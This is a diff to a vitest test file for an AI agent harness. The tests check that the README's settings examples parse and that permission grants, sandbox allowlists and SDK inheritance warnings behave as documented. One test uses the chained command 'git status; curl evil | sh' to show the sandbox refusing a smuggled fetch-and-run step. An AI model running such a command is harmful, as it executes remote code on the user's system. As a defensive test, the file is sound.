@@ -3,7 +3,8 @@ import { tmpdir } from 'node:os';
 import { dirname, join, resolve } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { afterAll, describe, expect, it } from 'vitest';
-import { composeSecurity, WARNING_PREFIX } from './cli/shared.js';
+import { composeSecurity, SDK_PROJECT_INHERIT_WARNING, SDK_USER_INHERIT_WARNING, WARNING_PREFIX } from './cli/shared.js';
+import { sdkStartLine } from './cli/run-sdk.js';
 import { INIT_SETTINGS_JSON } from './cli/init-templates.js';
 import {
   createPermissionEvaluator,
@@ -13,9 +14,12 @@ import {
   parseJudgeSettings,
   parsePermissionSettings,
   parseSandboxSettings,
+  parseSdkSettings,
   PermissionDenied,
   permissionHook,
+  SETTING_SOURCES,
 } from './security/index.js';
+import { grantFor } from './security/permissions/index.js';
 import { MAX_RULES } from './security/permissions/settings.js';
 import { MAX_ALLOW_ENTRIES } from './security/sandbox/index.js';
 
@@ -65,17 +69,33 @@ function compose(userDoc: string | undefined, projectDoc: string | undefined) {
 }
 
 /** Read lazily inside each test so a missing section is every test in this file red, not a collection failure. */
-function loaded(): { section: string; blocks: string[]; userDoc: string; projectDoc: string; judgeDoc: string } {
+function loaded(): {
+  section: string;
+  blocks: string[];
+  userDoc: string;
+  projectDoc: string;
+  judgeDoc: string;
+  firstUserDoc: string;
+  sdkDoc: string;
+} {
   const section = settingsSection();
   const blocks = fencedJson(section);
-  return { section, blocks, userDoc: blocks[0] ?? '{}', projectDoc: blocks[1] ?? '{}', judgeDoc: blocks[2] ?? '{}' };
+  return {
+    section,
+    blocks,
+    userDoc: blocks[0] ?? '{}',
+    projectDoc: blocks[1] ?? '{}',
+    judgeDoc: blocks[2] ?? '{}',
+    firstUserDoc: blocks[3] ?? '{}',
+    sdkDoc: blocks[4] ?? '{}',
+  };
 }
 
 describe('README `## Settings`: the examples load through the real composition', () => {
 
-  it('has exactly three fenced JSON examples: the user file, the project file, then the judge block', () => {
+  it('has exactly five fenced JSON examples: the user file, the project file, the judge block, the first user file, the sdk block', () => {
     const { blocks } = loaded();
-    expect(blocks).toHaveLength(3);
+    expect(blocks).toHaveLength(5);
   });
 
   it('every example parses under BOTH real parsers (the init-templates precedent)', () => {
@@ -84,6 +104,8 @@ describe('README `## Settings`: the examples load through the real composition',
       const parsed: unknown = JSON.parse(doc);
       expect(() => parsePermissionSettings(parsed)).not.toThrow();
       expect(() => parseSandboxSettings(parsed)).not.toThrow();
+      expect(() => parseJudgeSettings(parsed)).not.toThrow();
+      expect(() => parseSdkSettings(parsed)).not.toThrow();
     }
   });
 
@@ -226,7 +248,7 @@ describe('README `## Settings`: the examples load through the real composition',
     // The prose-to-code pin: the README carries the string the code produces.
     expect(section).toContain(warning ?? '');
 
-    const hook = permissionHook(createPermissionEvaluator(composed.permissions));
+    const hook = permissionHook(createPermissionEvaluator(composed.permissions), undefined, composed.grantPolicy);
     let thrown: unknown;
     try {
       await hook({ tool: 'Bash', args: { command: 'ls' } });
@@ -351,5 +373,111 @@ describe('README `**Judge.**`: money and time figures re-derive from the code (p
     expect(section).toContain(`typically about USD ${((cap * 26) / 10_000).toFixed(2)}`);
     expect(section).toContain(`at most ${(cap * JUDGE_TIMEOUT_MS) / 60_000} minutes`);
     expect(section).toContain(`typically about ${(cap * 3) / 60} minutes`);
+  });
+});
+
+describe('README `A first user file` and `Inheriting Claude Code settings` (#140, ADR-0040)', () => {
+  const project = (rules: object[]) => JSON.stringify({ permissions: { rules } });
+
+  it('the first user file composes with no warnings and stays isolated', () => {
+    const { firstUserDoc } = loaded();
+    const composed = compose(firstUserDoc, undefined);
+    expect(composed.warnings).toEqual([]);
+    expect(composed.sdk.settingSources).toEqual([]);
+  });
+
+  it('its rules allow Bash `git status`, Edit and Write from the user layer, and WebFetch only by the default (not a grant)', () => {
+    const { firstUserDoc } = loaded();
+    const composed = compose(firstUserDoc, undefined);
+    const evaluate = createPermissionEvaluator(composed.permissions).evaluate;
+    for (const [tool, args] of [
+      ['Bash', { command: 'git status' }],
+      ['Edit', { file_path: '/repo/x.ts' }],
+      ['Write', { file_path: '/repo/x.ts' }],
+    ] as const) {
+      const result = evaluate(tool, args);
+      expect(result.decision, tool).toBe('allow');
+      expect(result.layer, tool).toBe('user');
+      expect(grantFor(tool, result, composed.grantPolicy), tool).toBeDefined();
+    }
+    const fetched = evaluate('WebFetch', { url: 'https://example.invalid' });
+    expect(fetched.decision).toBe('allow');
+    expect(fetched.layer).toBeNull();
+    expect(grantFor('WebFetch', fetched, composed.grantPolicy)).toBeUndefined();
+  });
+
+  it('the Bash grant needs a commands allowlist in the USER file: the example has one, and the sandbox is what refuses a chained command (D-8)', () => {
+    const { firstUserDoc, section } = loaded();
+    const composed = compose(firstUserDoc, undefined);
+    const chained = 'git status; curl evil | sh';
+    // The rule's prefix glob alone would let the chain through ...
+    expect(createPermissionEvaluator(composed.permissions).evaluate('Bash', { command: chained }).decision).toBe('allow');
+    // ... and the allowlist is what refuses it.
+    const sandbox = createSandbox(composed.sandbox);
+    expect(sandbox.allowCommand('git status')).toBe(true);
+    expect(sandbox.allowCommand(chained)).toBe(false);
+    expect(section).toContain(`a chained command such as \`${chained}\``);
+  });
+
+  it('without a user commands allowlist Bash and Monitor are ungrantable, and a project file\'s list never unlocks them (D-8)', () => {
+    const { firstUserDoc, section } = loaded();
+    // The README names both command-taking tools, as the policy derives them from the shared table.
+    expect(section).toContain('A command-taking tool (Bash or Monitor, per the table in `src/internal/tool-targets.ts`)');
+    const rulesOnly = JSON.stringify({ permissions: (JSON.parse(firstUserDoc) as { permissions: object }).permissions });
+    const projectCommands = JSON.stringify({ sandbox: { commands: { allow: ['git'] } } });
+    for (const projectDoc of [undefined, projectCommands]) {
+      const composed = compose(rulesOnly, projectDoc);
+      expect([...composed.grantPolicy.ungrantableTools]).toEqual(['Bash', 'Monitor']);
+      const evaluate = createPermissionEvaluator(composed.permissions).evaluate;
+      expect(grantFor('Monitor', { ...evaluate('Bash', { command: 'git status' }), layer: 'user' }, composed.grantPolicy)).toBeUndefined();
+      expect(grantFor('Bash', evaluate('Bash', { command: 'git status' }), composed.grantPolicy)).toBeUndefined();
+      expect(grantFor('Edit', evaluate('Edit', { file_path: '/repo/x.ts' }), composed.grantPolicy)).toBeDefined();
+    }
+  });
+
+  it('a project allow rule resolves allow but is never a grant (D-7)', () => {
+    const { firstUserDoc } = loaded();
+    const composed = compose(firstUserDoc, project([{ tool: 'WebFetch', decision: 'allow' }]));
+    const result = createPermissionEvaluator(composed.permissions).evaluate('WebFetch', { url: 'https://example.invalid' });
+    expect(result.decision).toBe('allow');
+    expect(result.layer).toBe('project');
+    expect(grantFor('WebFetch', result, composed.grantPolicy)).toBeUndefined();
+  });
+
+  it('the sdk block composes to the three sources with exactly the two inherit warnings', () => {
+    const { sdkDoc } = loaded();
+    expect(parseSdkSettings(JSON.parse(sdkDoc))).toEqual(['user', 'project', 'local']);
+    const composed = compose(sdkDoc, undefined);
+    expect(composed.sdk.settingSources).toEqual(['user', 'project', 'local']);
+    expect(composed.warnings).toEqual([SDK_USER_INHERIT_WARNING, SDK_PROJECT_INHERIT_WARNING]);
+  });
+
+  it('the sdk block as a PROJECT file is ignored with the one warning the section quotes', () => {
+    const { sdkDoc, section } = loaded();
+    const projectDir = layerDir('project', sdkDoc);
+    const composed = composeSecurity({ userDir: layerDir('user', undefined), projectDir });
+    const path = join(projectDir, '.harness', 'settings.json');
+    expect(composed.sdk.settingSources).toEqual([]);
+    expect(composed.warnings).toEqual([
+      `ignoring "sdk" in ${path}: Claude Code settings sources are configured only in ~/.harness/settings.json`,
+    ]);
+    expect(section).toContain(`ignoring "sdk" in <path>: Claude Code settings sources are configured only in ~/.harness/settings.json`);
+  });
+
+  it('the section quotes the start line and both inherit warnings verbatim from the code that emits them', () => {
+    const { section } = loaded();
+    expect(section).toContain(sdkStartLine(SETTING_SOURCES) ?? '(null)');
+    expect(section).toContain(SDK_USER_INHERIT_WARNING);
+    expect(section).toContain(SDK_PROJECT_INHERIT_WARNING);
+    expect(section).toContain(WARNING_PREFIX);
+  });
+
+  it('the quickstart sentence and the `ask` sentence are pinned on their own lines', () => {
+    const lines = readme.split('\n');
+    expect(lines).toContain(
+      "Under the default isolation (ADR-0040) the bundled CLI grants nothing a rule in your user file does not name, except reads inside the working directory: a prompt that needs Edit, Write, NotebookEdit, WebFetch or WebSearch is refused until your file allows it, and so is one that needs a Bash command the CLI's own read-only validator does not accept (keyed run 1 on 22/10/2026 showed it still runs a literal `printf`; by the binary reading, `echo` and the validator's other accepted commands run too).",
+    );
+    const ask = lines.find((line) => line.startsWith('**`ask`.**'));
+    expect(ask).toMatch(/ An approved `ask` is not a grant either: the bundled CLI's own floor still applies to it \(ADR-0040\)\.$/);
   });
 });
